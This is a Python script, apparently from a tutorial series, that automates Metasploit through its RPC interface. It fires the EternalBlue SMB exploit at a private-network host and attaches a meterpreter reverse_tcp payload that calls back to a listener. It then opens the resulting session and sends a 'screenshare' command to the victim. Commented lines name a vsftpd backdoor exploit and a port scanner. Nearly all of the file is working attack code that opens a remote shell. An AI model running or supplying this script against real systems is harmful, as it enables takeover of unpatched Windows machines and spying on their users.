# $ msfconsole
# msf> load msgrpc Pass=123

# $ msfrpcd -P 123 
import time
import random , os 
from pymetasploit3.msfrpc import * #MsfRpcClient
from sqlalchemy import true
passwrd =123  # ''.join([ str(random.randrange(0 , 99)) for i in range(10) ]) 
print (f"Current password : {passwrd}" )
#os.system(f'msfconsole \\n load msgrpc Pass={passwrd}')
os.system(f'msfrpcd -P {passwrd} -S') # -S  -a 127.0.0.1 ')

client = MsfRpcClient('123', port=55552) #,ssl=True )  ,host='0.0.0.0' 55552= msgrpc run port

#print([m for m in dir(client) if not m.startswith('_')])

#print(client.modules.exploits)

exploit = client.modules.use('exploit', 'exploit/windows/smb/ms17_010_eternalblue') #'unix/ftp/vsftpd_234_backdoor')
#print(exploit.description)
#print(exploit.options)
#print(exploit.targets)
#print(exploit.default_target)
exploit.target = 0

print(exploit.targetpayloads())

print(exploit.missing_required) # Required options which haven't been set yet

exploit['RHOSTS'] = "192.168.2.5"
exploit['RPORT'] = "445"

'''
exploit['LHOST'] = "192.168.2.4"
exploit['LPORT'] = "4444"
'''
print(exploit.runoptions)

pl =client.modules.use('payload','windows/x64/meterpreter/reverse_tcp')
pl['LHOST'] = "192.168.2.4"
pl['LPORT'] = "4444"

exploit.targetpayloads()
exploit.execute(payload=pl)
time.sleep(10)
#console_id = client.consoles.console().cid
#console = client.consoles.console(console_id)
#console.run_module_with_output(exploit, payload='cmd/unix/interact')


print("Sessions avaiables : ")

# ftpsession = exploit.execute(payload=pl)
# shell = client.sessions.session(ftpsession)
# print(shell.read())

print(client.sessions.list)

for s in client.sessions.list.keys():
	print(s)

shell = client.sessions.session(list(client.sessions.list.keys())[0])

shell.write('screenshare\n')

print(shell.read())

#shell.stop()

#os.system("py3clean .")




# from pymetasploit3.msfrpc import *
# client = MsfRpcClient('123', port=55553)

# [m for m in dir(client) if not m.startswith('_')]
# ['auth', 'authenticated', 'call', 'client', 'consoles', 'core', 'db', 'jobs', 'login', 'logout', 'modules', 'plugins', 'port', 'server', 'token', 'sessions', 'ssl', 'uri']


'''
#________________video 6__________to use metas. to scanner
use auxiliary/scanner/portscan/tcp

set opetions [RHOSTS]=target and [PORTS]=target ports



'''